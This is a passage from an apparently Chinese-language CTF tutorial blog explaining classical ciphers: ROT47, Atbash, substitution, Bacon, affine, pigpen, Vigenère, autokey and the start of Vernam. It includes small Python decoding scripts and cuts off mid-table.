class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz0123456789明码表</span><br><span class="line">nopqrstuvwxyzabcdefghijklm5678901234密码表</span><br><span class="line">或者</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789明码表</span><br><span class="line">NOPQRSTUVWXYZABCDEFGHIJKLM5678901234密码表</span><br></pre></td></tr></table></figure><h5 id="rot47"><a href="#rot47" class="headerlink" title="rot47"></a>rot47</h5><p>对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，位移量为47。用于ROT47编码的字符其ASCII值范围是33－126（原因是由于0-32以及127与字符表示无关！！）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~明码表</span><br><span class="line">PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNO密码表</span><br></pre></td></tr></table></figure><h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><h5 id="Atbash-Cipher"><a href="#Atbash-Cipher" class="headerlink" title="Atbash Cipher"></a>Atbash Cipher</h5><p>埃特巴什码（Atbash Cipher）其实可以视为下面要介绍的简单替换密码的特例，它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。在罗马字母表中，它是这样出现的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ明码表</span><br><span class="line">ZYXWVUTSRQPONMLKJIHGFEDCBA密码表</span><br></pre></td></tr></table></figure><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：the quick brown fox jumps over the lazy dog</span><br><span class="line">密文：gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</span><br></pre></td></tr></table></figure><p>这种可以使用python实现或者在线网站做词频分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Atbash Cipher</span><br><span class="line">def caesar_Crypto(content):</span><br><span class="line">    all_plain=[]</span><br><span class="line">    lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    lower=lowercase[::-1]#此处需要修改</span><br><span class="line">    plain=&#x27;&#x27;</span><br><span class="line">    table=&#x27;&#x27;.maketrans(lower,lowercase)</span><br><span class="line">    for i in content:</span><br><span class="line">        plain=plain+i.translate(table)</span><br><span class="line">    all_plain.append(plain)</span><br><span class="line">    print(plain)</span><br><span class="line">content=&#x27;the quick brown fox jumps over the lazy dog&#x27;</span><br><span class="line">caesar_Crypto(content)#加密</span><br><span class="line">content=&#x27;gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt&#x27;</span><br><span class="line">caesar_Crypto(content)#解密</span><br></pre></td></tr></table></figure><h5 id="词频分析"><a href="#词频分析" class="headerlink" title="词频分析"></a>词频分析</h5><p>凯撒密码的密钥空间只有25所以导致凯撒被破解的可能性就很大了，于是在凯撒密码的基础上出现了简单替换密码（Simple Substitution Cipher）加密时，将每个明文字母替换为与之唯一对应且不同的字母。它与凯撒密码之间的区别是其密码字母表的字母不是简单的移位，而是完全是混乱的，这也使得其破解难度要高于凯撒密码。 比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ明码表</span><br><span class="line">RSTUVWXYZLMNOPQEFGHIJKCDBA密码表</span><br></pre></td></tr></table></figure><p>这种在解密时，我们一般是知道了每一个字母的对应规则，才可以正常解密。</p><p>由于这种加密方式导致其所有的密钥个数是26!(26阶乘) ，所以几乎上不可能使用暴力的解决方式</p><p>所以我们 一般采用词频分析在线网站：<a href="http://quipqiup.com/">http://quipqiup.com/</a></p><h4 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h4><p>培根密码，又名倍康尼密码（英语：Bacon’s cipher）是由法兰西斯·培根发明的一种隐写术。密文只有两个a和b，每个明文对应的字符都对应一个有a或b组成的长度是五的字符串。</p><p>加密时，明文中的每个字母都会转换成一组五个英文字母。其转换依靠下表：</p><table><thead><tr><th>明文</th><th>密文</th><th>明文</th><th>密文</th><th>明文</th><th>密文</th><th>明文</th><th>密文</th></tr></thead><tbody><tr><td>A/a</td><td>aaaaa</td><td>H/h</td><td>aabbb</td><td>O/o</td><td>abbba</td><td>V/v</td><td>babab</td></tr><tr><td>B/b</td><td>aaaab</td><td>I/i</td><td>abaaa</td><td>P/p</td><td>abbbb</td><td>W/w</td><td>babba</td></tr><tr><td>C/c</td><td>aaaba</td><td>J/j</td><td>abaab</td><td>Q/q</td><td>baaaa</td><td>X/x</td><td>babbb</td></tr><tr><td>D/d</td><td>aaabb</td><td>K/k</td><td>ababa</td><td>R/r</td><td>baaab</td><td>Y/y</td><td>bbaaa</td></tr><tr><td>E/e</td><td>aabaa</td><td>L/l</td><td>ababb</td><td>S/s</td><td>baaba</td><td>Z/z</td><td>bbaab</td></tr><tr><td>F/f</td><td>aabab</td><td>M/m</td><td>abbaa</td><td>T/t</td><td>baabb</td><td></td><td></td></tr><tr><td>G/g</td><td>aabba</td><td>N/n</td><td>abbab</td><td>U/u</td><td>babaa</td><td></td><td></td></tr></tbody></table><p>密码表二：</p><table><thead><tr><th>明文</th><th>密文</th><th>明文</th><th>密文</th><th>明文</th><th>密文</th><th>明文</th><th>密文</th></tr></thead><tbody><tr><td>A/a</td><td>aaaaa</td><td>G/g</td><td>aabba</td><td>N/n</td><td>abbaa</td><td>T/t</td><td>baaba</td></tr><tr><td>B/b</td><td>aaaab</td><td>H/h</td><td>aabbb</td><td>O/o</td><td>abbab</td><td>UV/uv</td><td>baabb</td></tr><tr><td>C/c</td><td>aaaba</td><td>IJ/ij</td><td>abaaa</td><td>P/p</td><td>abbba</td><td>W/w</td><td>babaa</td></tr><tr><td>D/d</td><td>aaabb</td><td>K/k</td><td>abaab</td><td>Q/q</td><td>abbbb</td><td>X/x</td><td>babab</td></tr><tr><td>E/e</td><td>aabaa</td><td>L/l</td><td>ababa</td><td>R/r</td><td>baaaa</td><td>Y/y</td><td>babba</td></tr><tr><td>F/f</td><td>aabab</td><td>M/m</td><td>ababb</td><td>S/s</td><td>baaab</td><td>Z/z</td><td>babbb</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要注意的是：i-j ABAAA和u-v BAABB有可能存在不一样的语义，需要结合上下文</span><br></pre></td></tr></table></figure><p>加密者需使用两种不同字体，分别代表A和B。按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种字体。<br>解密时，将上述方法倒转。所有字体一转回A，字体二转回B，以后再按上表拼回字母。</p><p>密文：<strong>T</strong>o e<strong>n</strong>c<strong>o</strong>de<strong>a</strong>mes<strong>s</strong>age e<strong>ac</strong>h letter<strong>of</strong>the<strong>pl</strong>a<strong>i</strong>nt<strong>ex</strong>t<strong>i</strong>s replaced b<strong>y a g</strong>rou<strong>p of f</strong>i<strong>ve</strong>of<strong>th</strong>e lett<strong>ers’A’<strong>o</strong>r ‘B’</strong>.</p><p>明文：BAABA BAABB AABAA AABBA AAAAA ABBAB ABBBA AABBA BAAAB AAAAA ABBBB AABBB BBAAA</p><p>    s   t   e   g   a   n   o   g   r   a   p   h   y</p><p>另外一种方法，其将大小写分别看作A与B，可用于无法使用不同字体的场合（例如只能处理纯文本时）。但这样比起字体不同更容易被看出来，而且和语言对大小写的要求也不太兼容。<br>培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上。</p><p>密文：SjkLnIljKHamJmkilABawiiioaAMbOaPIJmklNBaKijmBuaoljiAUWMakMHWNAakm</p><p>明文：BAABA BAABB AABAA AABBA AAAAA ABBAB ABBBA AABBA BAAAB AAAAA ABBBB AABBB BBAAA</p><p>    s   t   e   g   a   n   o   g   r   a   p   h   y</p><p>python实现培根密码表一的解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">txt=&#x27;SjkLnIljKHamJmkilABawiiioaAMbOaPIJmklNBaKijmBuaoljiAUWMakMHWNAakm&#x27;</span><br><span class="line">content=&#x27;&#x27;</span><br><span class="line">for i in txt:</span><br><span class="line">    if i.islower():</span><br><span class="line">        content+=&#x27;a&#x27;</span><br><span class="line">    elif i.isupper():</span><br><span class="line">        content+=&quot;b&quot;</span><br><span class="line">if len(content)%5==0:</span><br><span class="line">    # alphabet = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;]</span><br><span class="line">    alphabet=[chr(i) for i in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1)]</span><br><span class="line">    cipher = [&quot;aaaaa&quot;,&quot;aaaab&quot;,&quot;aaaba&quot;,&quot;aaabb&quot;,&quot;aabaa&quot;,&quot;aabab&quot;,&quot;aabba&quot;,&quot;aabbb&quot;,&quot;abaaa&quot;,&quot;abaab&quot;,&quot;ababa&quot;,&quot;ababb&quot;,&quot;abbaa&quot;,&quot;abbab&quot;,&quot;abbba&quot;,&quot;abbbb&quot;,&quot;baaaa&quot;,&quot;baaab&quot;,&quot;baaba&quot;,&quot;baabb&quot;,&quot;babaa&quot;,&quot;babab&quot;,&quot;babba&quot;,&quot;babbb&quot;,&quot;bbaaa&quot;,&quot;bbaab&quot;]</span><br><span class="line">    key =dict(zip(cipher,alphabet))#生成键值对应的字典</span><br><span class="line">    try:</span><br><span class="line">        flag = &#x27;&#x27;</span><br><span class="line">        for i in range(0,len(content),5):</span><br><span class="line">            value=content[i:i+5]#切片</span><br><span class="line">            flag+= key.get(value)#取键值</span><br><span class="line">    except:</span><br><span class="line">        flag = &#x27;&#x27;</span><br><span class="line">        table=&#x27;&#x27;.maketrans(&quot;ab&quot;,&quot;ba&quot;)#考虑到不知道ab对应的关系做一次转换</span><br><span class="line">        content=content.translate(table)</span><br><span class="line">        for i in range(0, len(content), 5):</span><br><span class="line">            value = content[i:i + 5]#切片</span><br><span class="line">            flag += key.get(value)#取键值</span><br><span class="line">    print(flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;不是培根密码&quot;)</span><br></pre></td></tr></table></figure><p>python实现培根密码表二的解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">content=&#x27;ABABAABAAABAABBAABAA&#x27;.lower()</span><br><span class="line">if len(content) % 5 == 0:</span><br><span class="line">    alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;(ij)&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;,&#x27;(uv)&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]</span><br><span class="line">    cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;,</span><br><span class="line">              &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;,</span><br><span class="line">              &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;]</span><br><span class="line">    key = dict(zip(cipher, alphabet))  # 生成键值对应的字典</span><br><span class="line">    try:</span><br><span class="line">        flag = &#x27;&#x27;</span><br><span class="line">        for i in range(0, len(content), 5):</span><br><span class="line">            value = content[i:i + 5]  # 切片</span><br><span class="line">            flag += key.get(value)  # 取键值</span><br><span class="line">    except:</span><br><span class="line">        flag = &#x27;&#x27;</span><br><span class="line">        table = &#x27;&#x27;.maketrans(&quot;ab&quot;, &quot;ba&quot;)</span><br><span class="line">        content = content.translate(table)</span><br><span class="line">        for i in range(0, len(content), 5):</span><br><span class="line">            value = content[i:i + 5]  # 切片</span><br><span class="line">            flag += key.get(value)  # 取键值</span><br><span class="line">    print(flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;不是培根密码&quot;)</span><br></pre></td></tr></table></figure><p>还有一种不太常用的方法</p><p>密文：xgdocpdcuuhlpfmglupfdlbhekpxiqknvpiimyykoeahrjjcfkmqusrkbuutqvlfb</p><p>明文：BAABA BAABB AABAA AABBA AAAAA ABBAB ABBBA AABBA BAAAB AAAAA ABBBB AABBB BBAAA    </p><p>​                s   t   e   g   a   n   o   g   r   a   p   h   y</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a--m  --&gt; A:字母a到m这一范围内的字母统一换成A </span><br><span class="line">n--z  --&gt; B:    字母n到z这一范围内的字母统一换成B</span><br></pre></td></tr></table></figure><p>培根密码所包含的信息可以和用于承载其的文章完全无关。</p><p>在线工具：<a href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码为单表替换密码的一种，字母系统中所有字母都藉一简单数学方程加密，对应至数值，或转回字母。</p><p>凯撒密码是将明文与密钥相加得到密文，仿射密码则是将明文与密钥的一部分相乘然后加上密钥的另一部分得到</p><p>为了方便计算将26个字母分别用数字表示：a=0，b=1，… ，z=25。</p><p>仿射加密的密钥有两个a和b，取值范围都是0到25之间。主要对a有要求，b没有要求：</p><ul><li>a要求与26互质（互质就是这两个数的公因数只有1）hint：这样的话<ul><li>26的因数有：1，2，13</li><li>上述的结果要求a的因数不包含2或者13即可</li></ul></li></ul><p>仿射密码加密：假设x是明文，y是密文，加密公式y=(a×x+b)mod26，密文=（明文×乘数+位移数）mod 26(mod取值就在0到25之间)</p><p>具体过程可以代入数字表示，当a=7，b=3时，加密公式变成了：密文=（明文×7+3）mod 26</p><p>当明文等于c的时候：（明文×7+3）mod 26=（2×7+3）mod 26=17=y也就是r密文</p><p>解密明文=（密文-b）/a结果有可能是小数无法做mod运算，于是可以使用除法变成乘法，（密文-b）/a转换为（密文-b）a的乘法逆元</p><p>所以问题变成了怎么去找到这个a的乘法逆元</p><ul><li>乘法逆元</li></ul><p>假设用m表示a的乘法逆元，那么(a*m)mod 26=1</p><p>当a=7可以用代码实现求m，并且我们只需要一个符合条件的即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">m=1</span><br><span class="line">while True:</span><br><span class="line">    if (7*m)%26==1:</span><br><span class="line">        print(m)</span><br><span class="line">        break</span><br><span class="line">    m=m+1</span><br><span class="line">#15</span><br><span class="line">for i in range(0,26):</span><br><span class="line">    if (7 * i) % 26 == 1:</span><br><span class="line">        print(i)</span><br><span class="line">#15</span><br></pre></td></tr></table></figure><p>所以a的乘法逆元就是15，然后代入公式x=15（17-m）mod26=（15×14）mod26=2所以得到明文是c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#加密公式：c=(11m+7)mod26,对应的a=11,b等于7密文信息：dikxourxd</span><br><span class="line"></span><br><span class="line">content = &#x27;dikxourxd&#x27;</span><br><span class="line">m = 1</span><br><span class="line">while True:</span><br><span class="line">    if (11 * m) % 26 == 1:</span><br><span class="line">        print(m)  # 得到乘法逆元</span><br><span class="line">        break</span><br><span class="line">    m = m + 1</span><br><span class="line">for i in content:</span><br><span class="line">    print(chr(97 + (ord(i) - 97 - 7) * 19 % 26))</span><br><span class="line">#ctfsdnisc</span><br></pre></td></tr></table></figure><ul><li>暴力破解</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content = &#x27;szzyfimhyzd&#x27;</span><br><span class="line">plan = &#x27;17,-8&#x27;#a和b的值</span><br><span class="line">a = int(plan.split(&#x27;,&#x27;)[0])</span><br><span class="line">b = int(plan.split(&#x27;,&#x27;)[1])</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in content:</span><br><span class="line">    for j in range(0, 26):</span><br><span class="line">        if (a * j + b) % 26 == ord(i) - ord(&#x27;a&#x27;):</span><br><span class="line">            flag+=chr(97 + j)</span><br><span class="line">print(flag)</span><br><span class="line">#affineshift</span><br></pre></td></tr></table></figure><h4 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h4><p>猪圈密码（Pigpen cipher)也称作共济会密码（masonic ciphe）、共济会员密码（Freemason’s cipher）等，是一种以格子为基础的简单替代式密码，把英文字母替换成了各种图形符号。</p><p>这是一种外形古怪的密码，已经传递了几百年。早在1700年代，共济会常常使用这种密码保护一些私密纪录或用来通讯。没有人明确知道它是什么时候发明的，但这个密码被一个叫“自由石匠”的组织所使用，也被美国内战时的盟军所使用。</p><p>猪圈密码作为一种简单替代式密码，其实可以设计出无数种变种，但此密码易破解。</p><p><img src="/image/media/2022/crypto/3.png"></p><p>由线和点组成的形状即代表在该形状内的那个字符，比如∧=V、∨=S、⊔=B、⊓=H得到密码表</p><p><img src="/image/media/2022/crypto/4.png"></p><p>如明文为 <code>X marks the spot</code> ，那么密文如下</p><p><img src="/image/media/2022/crypto/5.png"></p><ul><li>猪圈密码变体0</li></ul><p>将上述的密码表做转换：A→J，E→N，I→R</p><ul><li>猪圈密码变体1</li></ul><p><img src="/image/media/2022/crypto/6.png"></p><p>上述变体的猪圈密码表对应为：</p><p><img src="/image/media/2022/crypto/7.png"></p><ul><li>猪圈密码变体2</li></ul><p><img src="/image/media/2022/crypto/8.png"></p><p>解密可以使用在线工具：<a href="https://www.xiao84.com/tools/103177.html">https://www.xiao84.com/tools/103177.html</a></p><h4 id="跳舞的小人"><a href="#跳舞的小人" class="headerlink" title="跳舞的小人"></a>跳舞的小人</h4><p>这种密码出自于福尔摩斯探案集。每一个跳舞的小人实际上对应的是英文二十六个字母中的一个，而小人手中的旗子则表明该字母是单词的最后一个字母，如果仅仅是一个单词而不是句子，或者是句子中最后的一个单词，则单词中最后一个字母不必举旗。</p><p><img src="/image/media/2022/crypto/1.jpg"></p><h3 id="多表替换密码"><a href="#多表替换密码" class="headerlink" title="多表替换密码"></a>多表替换密码</h3><p>针对单表代替密码容易被频率分析法破解的缺点，人们提出多表代换密码，用一系列（两个以上）代换表依次对明文消息的字母进行代换。</p><p>在多表替换加密中，多表替换的加密过程中由到多张表组成，每个字符分别用不同的密码表进行替换。</p><p>多表替换替换密码主要优点就是解决了单表替换密码中频率分析的问题。并且密文跟明文并不是一一对应的</p><p>比如：凯撒密码可以变成一种基于密钥的凯撒密码（Keyed Caesar）：利用一个密钥，将密钥的每一位转换为数字（一般转化为字母表对应顺序的数字），分别以这一数字为密钥加密明文的每一位字母。比如：</p><p>明文信息：s0a6u3u1s0bv1a</p><p>密钥：guangtou</p><p>偏移：6，20，0，13，6，19，14，20</p><p>密文：y0u6u3h1y0uj1u</p><p><a href="http://rumkin.com/tools/cipher/caesar-keyed.php">http://rumkin.com/tools/cipher/caesar-keyed.php</a></p><h4 id="Vigenere-维吉尼亚密码"><a href="#Vigenere-维吉尼亚密码" class="headerlink" title="Vigenere 维吉尼亚密码"></a>Vigenere 维吉尼亚密码</h4><p>维吉尼亚是多表替换密码中比较典型的代表，维吉尼亚密码是在凯撒密码基础上产生的一种加密方法，它将凯撒密码的全部25种位移排序为一张表，与原字母序列共同组成26行及26列的字母表。另外，维吉尼亚密码必须有一个密钥，这个密钥由字母组成，最少一个，最多可与明文字母数量相等。</p><p>现有明文：vigenere和密钥：abc</p><p>首先，密钥长度需要与明文长度相同，如果少于明文长度，则重复拼接直到相同。本例中，明文长度为3个字母（非字母均被忽略），密钥会被程序补全为”abcabcab”。现在根据如下维吉尼亚密码表格进行加密：</p><p><img src="/image/media/2022/crypto/9.png"></p><p>明文第一个字母是v，密钥第一个字母是a，在表格中找到v列与a行相交点，字母v就是密文第一个字母；同理，i列与b行交点字母是j……</p><p><img src="/image/media/2022/crypto/10.png"></p><p>密文：vjieogrf</p><ul><li>维吉尼亚密码只对字母进行加密，不区分大小写，若文本中出现非字母字符会原样保留。</li><li>如果输入多行文本，每行是单独加密的。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 维吉尼亚密码解密</span><br><span class="line">content = &#x27;Vjieogrf&#x27;</span><br><span class="line">key = &#x27;abc&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">num = (len(content) // len(key)) + 1</span><br><span class="line">new_key = key * num  # 拓展key的长度</span><br><span class="line">key_to_num = [ord(k) - 97 for k in new_key]  # 列表推导式，将密钥中的数值转成0到26的值</span><br><span class="line">for i in range(len(content)):</span><br><span class="line">    if content[i].islower():  # 小写字母</span><br><span class="line">        flag += chr((ord(content[i])-97-key_to_num[i])%26+97)  # 加密往前移动，解密往后移动</span><br><span class="line">    elif content[i].isupper(): # 大写字母</span><br><span class="line">        flag += chr((ord(content[i]) - 65 - key_to_num[i]) % 26 + 65)  # 加密往前移动，解密往后移动</span><br><span class="line">    else:</span><br><span class="line">        flag += content[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>上述代码存在的问题：</p><ul><li>key_to_num做减法的时候是97，需要考虑到key可能是大写</li><li>拓展长度的时候需要计算感觉不太灵活</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 维吉尼亚密码解密</span><br><span class="line">content = &#x27;Vjieogrf&#x27;</span><br><span class="line">key = &#x27;Abc&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">key_to_num = [ord(k) - 97 for k in key.lower()]  # 列表推导式，将密钥中的数值转成0到26的值</span><br><span class="line">for i in range(len(content)):</span><br><span class="line">    if content[i].islower():  # 小写字母</span><br><span class="line">        flag += chr((ord(content[i]) - 97 - key_to_num[i%len(key)]) % 26 + 97)  # 加密往前移动，解密往后移动</span><br><span class="line">    elif content[i].isupper():  # 大写字母</span><br><span class="line">        flag += chr((ord(content[i]) - 65 - key_to_num[i%len(key)]) % 26 + 65)  # 加密往前移动，解密往后移动</span><br><span class="line">    else:</span><br><span class="line">        flag += content[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="AutokeyCipher"><a href="#AutokeyCipher" class="headerlink" title="AutokeyCipher"></a>AutokeyCipher</h4><p>自动密钥密码（Autokey Cipher）也是多表替换密码，与维吉尼亚密码类似，但使用不同的方法生成密钥。通常来说它要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码。下面我们以关键词自动密钥为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</span><br><span class="line">关键词：CULTURE</span><br><span class="line">根据关键词生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE</span><br></pre></td></tr></table></figure><p>明文的长度跟密钥的长度去掉空格后一样长，然后生成一个跟维吉尼亚密码相似的表格然后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</span><br></pre></td></tr></table></figure><h4 id="费纳姆密码"><a href="#费纳姆密码" class="headerlink" title="费纳姆密码"></a>费纳姆密码</h4><p>费纳姆密码其实是一种由二进制产生的替换密码，加密时要将明文和密钥都转成7位二进制数。是双方约定一个数，明文异或加上这个数就是密文。这个数相当于密钥（可以是单词 词组 句子 几个字母也行）。</p><table><thead><tr><th>大写字母</th><th>ASCⅡ码</th><th>大写字母</th><th>ASCⅡ码</th><th>小写字母</th><th>ASCⅡ码</th><th>小写字母</th><th>ASCⅡ码</th></tr></thead><tbody><tr><td>A</td><td>1000001</td><td>N</td><td>1001110</td><td>a</td><td>1100001</td><td>n</td><td>1101110</td></tr><tr><td>B</td><td>1000010</td><td>O</td><td>1001111</td><td>b</td><td>1100010</td><td>o</td><td>1101111</td></tr><tr><td>C</td><td>1000011</td><td>P</td><td>1010000</td><td>c</td><td>1100011</td><td>p</td><td>1110000</td></tr><tr><td>D</td><td>1000100</td><td>Q</td><td>1010001</td><td>d</td><td>1100100</td><td>q</td><td>1110001</td></tr><tr><td>E</td><td>1000101</td><td>R</td><td>1010010</td><td>e</td><td>1100101</td><td>r</td><td>1110010</td></tr><tr><td>F</td><td>1000110</td><td>S</td><td>1010011</td><td>f</td><td>1100110</td><td>s</td><td>1110011</td></tr><tr><td>G</td><td>1000111</td><td>T</td><td>1010100</td><td>g</td><td>1100111</td><td>t</td><td>1110100</td></tr><tr><td>H</td><td>1001000</td><td>U</td><td>1010101</td><td>h</td><td>1101000</td><td>u</td><td>1110101</td></tr><tr><td>I</td><td>1001001</td><td>V</td><td>1010110</td><td>i</td><td>1101001</td><td>v</td><td>1110110</td></tr><tr><td>J</td><td>1001010</td><td>W</td><td>1010111</td><td>j</td><td>1101010</td><td>w</td><td>1110111</td></tr><tr><td>K</td><td>1001011</td><td>X</td><td>1011000</td><td>k</td><td>1101011</td><td>x<